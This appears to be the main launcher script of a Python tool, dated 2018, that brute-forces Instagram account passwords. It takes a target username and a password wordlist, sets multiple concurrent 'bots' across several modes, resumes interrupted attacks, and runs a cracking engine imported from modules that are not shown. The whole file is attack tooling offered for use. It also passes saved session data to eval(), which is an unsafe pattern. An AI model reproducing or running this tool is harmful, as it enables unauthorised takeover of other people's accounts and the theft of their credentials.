# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruteforce Instagram

from time import sleep 
from os.path import exists
from sys import exit, version 
from lib.bruter import Bruter 
from lib.session import Session 
from argparse import ArgumentParser, ArgumentTypeError


def _input(msg):
 return raw_input(msg).lower() if int(version.split()[0].split('.')[0]) == 2 else input(msg).lower()


def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError('mode must be a number')

    n = int(n)
    if n > 3:
        raise ArgumentTypeError('maximum for a mode is 3')
    if n < 0:
        raise ArgumentTypeError('minimum for a mode is 0')
    return n


def args():
    args = ArgumentParser()
    args.add_argument('username', help='email or username')
    args.add_argument('wordlist', help='password list')
    args.add_argument('-m', '--mode', default=2, type=valid_int, help='modes; 0: 8bots, 1: 4bots, 2: 2bots, 3: 1bot')
    return args.parse_args()


def main():
    arugments = args()
    mode = arugments.mode 
    username = arugments.username
    wordlist = arugments.wordlist
    modes = { 0: 128, 1: 64, 2: 32, 3: 16 }

    if not exists(wordlist):
        exit('[!] Invalid path to wordlist')

    session = Session(username.title(), wordlist)
    engine = Bruter(username.title(), modes[mode], wordlist)

    if session.exists:
        if _input('Do you want to resume the attack? [y/n]: ').split()[0][0] == 'y':
            data = session.read()
            if data:
                engine.attempts = int(data['attempts'])
                engine.passlist.queue = eval(data['queue'])
                engine.retrieve = True

    # start attack
    try:
        engine.start()
    except KeyboardInterrupt:
        engine.user_abort = True 
        engine.stop()
    finally:
        if all([engine.spyder.proxy_info, not engine.isFound]):
            engine.display(engine.pwd)

        if all([not engine.read, engine.user_abort, not engine.isFound]):
            print('{}[!] Exiting ...'.format('' if not engine.spyder.proxy_info else '\n'))

        if all([engine.read, not engine.isFound]):
            print('\n[*] Password not found')

        try:
            sleep(1.5)
        except:
            pass 
            
        engine.stop()


if __name__ == '__main__':
    main()
